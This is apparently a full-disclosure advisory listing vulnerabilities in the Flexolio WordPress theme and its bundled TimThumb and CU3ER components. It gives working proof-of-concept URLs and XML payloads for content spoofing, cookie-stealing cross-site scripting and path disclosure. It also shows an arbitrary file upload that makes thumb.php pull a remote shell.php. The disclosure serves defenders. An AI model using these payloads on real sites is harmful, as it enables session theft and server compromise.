Subject: [FD] Multiple vulnerabilities in Flexolio for WordPress

Hello list!

There are Content Spoofing, Cross-Site Scripting, Full path disclosure, 
Abuse of Functionality, Denial of Service and Arbitrary File Upload 
vulnerabilities in Flexolio for WordPress. Which contains TimThumb and 
CU3ER.

In April 2011 I wrote about vulnerabilities in TimThumb 
(http://seclists.org/fulldisclosure/2011/Apr/227) and in April 2014 I wrote 
about vulnerabilities in CU3ER 
(http://seclists.org/fulldisclosure/2014/Apr/244).

Content Spoofing (Content Injection) (WASC-12):

http://site/wp-content/themes/flexolio/inc/cu3er/cu3er.swf?xml=http://site2/1.xml

File 1.xml:

<?xml version="1.0" encoding="UTF-8"?>
<cu3er>
<slides>
<slide>
<url>1.jpg</url>
<link>http://websecurity.com.ua</link>
</slide>
</slides>
</cu3er>

Cross-Site Scripting (WASC-08):

http://site/wp-content/themes/flexolio/inc/cu3er/cu3er.swf?xml=http://site2

File xss.xml:

<?xml version="1.0" encoding="UTF-8"?>
<cu3er>
<slides>
<slide>
<url>1.jpg</url>
<link>javascript:alert(document.cookie)</link>
</slide>
</slides>
</cu3er>

For cross-domain attacks it's needed to have crossdomain.xml at web site 
with xml-files.

Cross-Site Scripting (WASC-08):

http://site/wp-content/themes/flexolio/inc/thumb.php?src=1%3Cbody%20onload=alert(document.cookie)%3E.jpg

Full path disclosure (WASC-13):

http://site/wp-content/themes/flexolio/inc/thumb.php?src=http://

And also Abuse of Functionality and DoS in vulnerabilities in TimThumb 
(http://seclists.org/fulldisclosure/2011/Apr/227) and Arbitrary File Upload 
vulnerability, which was disclosed after 3,5 months after my disclosure of 
previous holes. They are possible in old versions of the theme, because in 
the last versions of the theme in TimThumb the access to remote sites is 
forbidden.

Arbitrary File Upload (WASC-31):

http://site/wp-content/themes/flexolio/inc/thumb.php?src=http://site.com/shell.php

Full path disclosure (WASC-13):

FPD in php-files of the theme (by default) or in error_log. In index.php and 
other php-files.
